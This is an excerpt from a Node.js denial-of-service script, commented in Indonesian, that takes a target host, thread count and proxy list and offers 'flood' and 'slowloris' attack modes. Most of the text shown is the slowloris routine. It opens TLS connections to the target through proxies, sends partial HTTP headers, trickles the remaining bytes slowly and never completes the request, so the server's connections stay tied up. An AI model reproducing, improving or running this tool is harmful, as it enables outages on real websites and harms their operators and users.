...
if (process.argv.length < 8) {
    console.log(`Usage: host time req thread proxy.txt mode`);
    console.log(`Mode: flood / slowloris`);
    process.exit();
}
...
const args = {
    ...
    mode: process.argv[7] // 'flood' or 'slowloris'
};
...
if (cluster.isMaster) {
    ...
    console.log(`\x1b[33mMode: \x1b[37m${args.mode.toUpperCase()}\x1b[0m`);
    console.log(`\x1b[36m--------------------------------------------\x1b[0m`);
...
function runSlowloris() {
    ...
    const proxyOptions = {
        ...
        timeout: 300 // 5 menit timeout buat slowloris
    };
    ...
    Socker.HTTP(proxyOptions, (connection, error) => {
        ...
        const tlsSocket = tls.connect(443, parsedTarget.host, tlsOptions, () => {
            ...
            const partialHeaders = [
                ...
                `Pragma: no-cache\r\n`,
                // HEADER GA PERNAH SELESAI - INI INTI SLOWLORIS
                `X-Slowloris: ${randstr(50)}\r\n`,
                `X-Keep-Alive: ${randstr(30)}\r\n`,
                `X-Partial: ${randstr(40)}\r\n`
            ];

            // Kirim semua header kecuali final \r\n\r\n
            let headerChunk = partialHeaders.join('');
            
            // Kirim 90% header dulu, sisakan beberapa byte buat dikirim lambat
            const splitPoint = Math.floor(headerChunk.length * 0.85);
            const firstPart = headerChunk.substring(0, splitPoint);
            const secondPart = headerChunk.substring(splitPoint);

            try {
                // Kirim sebagian header
                tlsSocket.write(firstPart);
            } catch (err) { }

            // Kirim sisa header secara sangat lambat (1 byte per detik)
            let byteIndex = 0;
            const slowInterval = setInterval(() => {
                if (byteIndex < secondPart.length) {
                    try {
                        tlsSocket.write(secondPart[byteIndex]);
                        byteIndex++;
                    } catch (err) {
                    ...
                    // Setelah semua header terkirim, tetap jangan kirim \r\n\r\n
                    // Kirim data palsu setiap beberapa detik biar koneksi tetap hidup
                    try {
                        tlsSocket.write(`X-Slowloris-KeepAlive: ${randstr(20)}\r\n`);
                    } catch (err) {
                        clearInterval(slowInterval);
                        tlsSocket.destroy();
                        connection.destroy();
            ...
            }, 3000); // 3 detik per byte - SANGAT LAMBAT

            // Timer buat destroy koneksi setelah timeout
